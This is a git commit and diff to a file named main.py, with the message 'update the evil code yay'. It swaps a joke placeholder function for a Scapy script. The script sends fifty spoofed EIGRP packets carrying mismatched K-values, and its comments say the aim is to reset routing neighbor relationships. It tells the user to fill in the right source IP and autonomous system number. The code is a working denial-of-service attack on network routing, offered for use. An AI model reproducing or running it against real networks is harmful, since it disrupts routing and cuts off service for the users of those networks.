6338865e5a8831287cc2f35c11987a0c190a84c9
eagle67-lab <62521543+eagle67-lab@users.noreply.github.com>
2022-11-30 17:24:36 +0200

    update the evil code yay (:

--- main.py
+++ main.py
@@ -1,11 +1,15 @@
-#import some
+import time
+from scapy.all import *
 
+#Import EIGRP
+load_contrib('eigrp')
 
-if(1)
-{
-  destroyInternet()
-}
+for i in range (0,50):
+	#Send EIGRP packet to reset server relationships.
+	#Change the sourse IP address (src) to the correct IP address.
+	#Change Autonomous System number (asn) to the correct number.
+	sendp(Ether()/IP(src="0.0.0.0",dst="8.8.8.8")/EIGRP(asn=100,tlvlist=[EIGRPParam(k1=255, k2=255, k3=255, k4=255, k5=255),EIGRPSwVer()]))
 
-
-def destroyInternet():
-  pass
+	time.sleep(1)
+  
+  
